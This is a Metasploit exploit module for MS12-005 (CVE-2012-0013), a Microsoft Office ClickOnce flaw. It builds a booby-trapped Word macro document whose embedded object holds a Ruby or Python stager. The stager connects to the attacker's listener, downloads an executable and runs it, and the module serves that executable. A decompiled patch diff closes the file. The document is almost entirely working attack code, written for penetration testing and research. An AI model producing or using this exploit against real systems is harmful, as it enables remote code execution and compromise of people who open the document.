# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex/zip'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::TcpServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability",
      'Description'    => %q{
          This module exploits a vulnerability found in Microsoft Office's ClickOnce
        feature.  When handling a Macro document, the application fails to recognize
        certain file extensions as dangerous executables, which can be used to bypass
        the warning message.  This allows you to trick your victim into opening the
        malicious document, which will load up either a python or ruby payload based on
        your choosing, and then finally download and execute our executable.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Yorick Koster', #Vuln discovery
          'sinn3r'         #Metasploit
        ],
      'References'     =>
        [
          ['CVE', '2012-0013'],
          ['OSVDB', '78207'],
          ['MSB', 'ms12-005'],
          ['BID', '51284'],
          ['URL', 'http://support.microsoft.com/default.aspx?scid=kb;EN-US;2584146'],
          ['URL', 'http://exploitshop.wordpress.com/2012/01/14/ms12-005-embedded-object-package-allow-arbitrary-code-execution/']
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'DefaultOptions'  =>
        {
          'ExitFunction'          => "none",
          'DisablePayloadHandler' => 'false'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Microsoft Office Word 2007/2010 on Windows 7', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jan 10 2012",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptEnum.new('PAYLOAD_TYPE', [true, "The initial payload type", 'PYTHON', %w(RUBY PYTHON)]),
          OptString.new("BODY", [false, 'The message for the document body', '']),
          OptString.new('FILENAME', [true, 'The Office document macro file', 'msf.docm'])
        ], self.class)
  end


  #
  # Return the first-stage payload that will download our malicious executable.
  #
  def get_download_exec_payload(type, lhost, lport)
    payload_name = Rex::Text.rand_text_alpha(7)

    # Padd up 6 null bytes so the first few characters won't get cut off
    p = "\x00"*6

    case type
    when :rb
      p << %Q|
      require 'socket'
      require 'tempfile'
      begin
        cli = TCPSocket.open("#{lhost}",#{lport})
        buf = ''
        while l = cli.gets
          buf << l
        end
        cli.close
        tmp = Tempfile.new(['#{payload_name}','.exe'])
        t = tmp.path
        tmp.binmode
        tmp.write(buf)
        tmp.close
        exec(t)
      rescue
      end#|

    when :py
      p << %Q|
      import socket
      import tempfile
      import os

      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect(("#{lhost}", #{lport}))
      buf = ""
      while True:
        data = s.recv(1024)
        if data:
          buf += data
        else:
          break
      s.close
      temp = tempfile.gettempdir() + "\\\\\\" + "#{payload_name}.exe"
      f = open(temp, "wb")
      f.write(buf)
      f.close
      f = None
      os.system(temp)
      #|

    end

    p = p.gsub(/^\t\t\t/, '')

    return p
  end


  #
  # Reads a file that'll be packaged.
  # This will patch certain files on the fly, or return the original content of the file.
  #
  def on_file_read(fname, file)
    f = open(file, 'rb')
    buf = f.read
    f.close

    # Modify certain files on the fly
    case file
    when /oleObject1\.bin/
      # Patch the OLE object file with our payload
      print_status("Patching OLE object")
      ptype = datastore['PAYLOAD_TYPE'] == 'PYTHON' ? :py : :rb
      p     = get_download_exec_payload(ptype, @ip, @port)
      buf   = buf.gsub(/MYPAYLOAD/, p)

      # Patch username
      username = Rex::Text.rand_text_alpha(5)
      buf = buf.gsub(/METASPLOIT/, username)
      buf = buf.gsub(/#{Rex::Text.to_unicode("METASPLOIT")}/, Rex::Text.to_unicode(username))

      # Patch the filename
      f = Rex::Text.rand_text_alpha(6)
      buf = buf.gsub(/MYFILENAME/, f)
      buf = buf.gsub(/#{Rex::Text.to_unicode("MYFILENAME")}/, Rex::Text.to_unicode(f))

      # Patch the extension name
      ext = ptype.to_s
      buf = buf.gsub(/MYEXT/, ext)
      buf = buf.gsub(/#{Rex::Text.to_unicode("MYEXT")}/, Rex::Text.to_unicode(ext))

    when /document\.xml/
      print_status("Patching document body")
      # Patch the docx body
      buf = buf.gsub(/W00TW00T/, datastore['BODY'])

    end

    # The original filename of __rels is actually ".rels".
    # But for some reason if that's our original filename, it won't be included
    # in the archive. So this hacks around that.
    case fname
    when /__rels/
      fname = fname.gsub(/\_\_rels/, '.rels')
    end

    yield fname, buf
  end


  #
  # Packages the Office Macro Document
  #
  def package_docm_rex(path)
    zip = Rex::Zip::Archive.new

    Dir["#{path}/**/**"].each do |file|
      p = file.sub(path+'/','')

      if File.directory?(file)
        print_status("Packaging directory: #{file}")
        zip.add_file(p)
      else
        on_file_read(p, file) do |fname, buf|
          print_status("Packaging file: #{fname}")
          zip.add_file(fname, buf)
        end
      end
    end

    zip.pack
  end


  #
  # Return the malicious executable
  #
  def on_client_connect(cli)
    print_status("#{cli.peerhost}:#{cli.peerport} - Sending executable (#{@exe.length.to_s} bytes)")
    cli.put(@exe)
    service.close_client(cli)
  end


  def exploit
    @ip    = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']
    @port  = datastore['SRVPORT']

    print_status("Generating our docm file...")
    path  = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2012-0013')
    docm = package_docm_rex(path)

    file_create(docm)
    print_good("Let your victim open #{datastore['FILENAME']}")

    print_status("Generating our malicious executable...")
    @exe = generate_payload_exe

    print_status("Ready to deliver your payload on #{@ip}:#{@port.to_s}")
    super
  end
end

=begin
mbp:win7_diff sinn3r$ diff patch/GetCurrentIcon.c vuln/GetCurrentIcon.c 
1c1
< void *__thiscall CPackage::_GetCurrentIcon(void *this, int a2)
---
> const WCHAR *__thiscall CPackage::_GetCurrentIcon(void *this, int a2)
...
24c24
<     if ( AssocIsDangerous(result) || !SHGetFileInfoW(pszPath, 0x80u, &psfi, 0x2B4u, 0x110u) )
---
>     if ( IsProgIDInList(0, result, extList, 0x11u) || !SHGetFileInfoW(pszPath, 0x80u, &psfi, 0x2B4u, 0x110u) )
31c31
=end
